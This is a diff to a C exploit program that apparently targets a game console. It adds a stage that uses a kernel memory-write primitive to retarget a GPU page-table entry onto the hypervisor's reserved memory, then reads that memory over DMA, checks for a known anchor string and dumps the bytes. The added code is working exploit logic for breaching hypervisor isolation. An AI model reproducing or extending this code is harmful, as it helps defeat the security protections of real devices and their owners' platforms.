@@ -134,9 +134,9 @@ static void hexdump(const char *tag, const uint8_t *b, int n) {
 }
 
 int main(void) {
-  uint64_t bufs[6][2]; /* [0]=cpu va, [1]=off */
-  static const char *names[6] = {"victim", "staging", "cmd", "victim2",
-                                 "victim3", "victim4"};
+  uint64_t bufs[7][2]; /* [0]=cpu va, [1]=off */
+  static const char *names[7] = {"victim", "staging", "cmd", "victim2",
+                                 "victim3", "victim4", "hv"};
   uint64_t text_pa = 0, text2m = 0, off_in = 0;
   uint64_t pe = 0;
 
@@ -161,7 +161,7 @@ int main(void) {
     }
   }
 
-  for (int i = 0; i < 6; i++) {
+  for (int i = 0; i < 7; i++) {
     off_t off = 0;
     void *va = NULL;
     if (sceKernelAllocateDirectMemory(0, 0x400000000ULL, DMEM_SIZE, DMEM_SIZE,
@@ -302,6 +302,40 @@ int main(void) {
         kwrite64(vlv, vlval);
         notify("gpuread: victim3 leaf restored\n");
       }
+    }
+  }
+
+  /* ---- 3. HV carveout through the GPU ----------------------------------- */
+  {
+    const uint64_t HV_BASE = 0x062800000ULL;   /* regular console */
+    const uint64_t HV_ANCHOR_OFF = 0x1ba10ULL; /* "hvcGF" */
+    uint64_t vlv = 0, vlval = 0;
+    if (walk("hv", bufs[6][0], &vlv, &vlval) == 2 && (vlval & 1)) {
+      uint64_t nv = (vlval & ~GPU_LEAF2M_MASK) | (HV_BASE & GPU_LEAF2M_MASK) |
+                    (1ULL << 50);
+      notify("gpuread: HV retarget %#lx -> %#lx\n", (unsigned long)vlval,
+             (unsigned long)nv);
+      kwrite64(vlv, nv);
+
+      /* first page of the reservation */
+      memset((void *)cmd_va, 0, 0x1000);
+      int rc = dma(cmd_va, bufs[6][0], cmd_va, 0x1000);
+      hexdump("HV00", (const uint8_t *)cmd_va, 32);
+      uint64_t nz = 0;
+      for (int i = 0; i < 0x1000; i++) nz += (((const uint8_t *)cmd_va)[i] != 0);
+      notify("gpuread: HV rc=%d nonzero_of_4096=%lu\n", rc, (unsigned long)nz);
+
+      /* the page holding the documented anchor */
+      memset((void *)cmd_va, 0, 0x1000);
+      rc = dma(cmd_va, bufs[6][0] + (HV_ANCHOR_OFF & ~0xFFFULL), cmd_va, 0x1000);
+      const char *a = (const char *)cmd_va + (HV_ANCHOR_OFF & 0xFFF);
+      notify("gpuread: HV anchor @%#lx = '%c%c%c%c%c' %s\n",
+             (unsigned long)HV_ANCHOR_OFF, a[0], a[1], a[2], a[3], a[4],
+             memcmp(a, "hvcGF", 5) == 0 ? "ANCHOR-OK" : "no-anchor");
+      hexdump("HVAN", (const uint8_t *)cmd_va, 32);
+
+      kwrite64(vlv, vlval);
+      notify("gpuread: hv leaf restored\n");
     }
   }
 
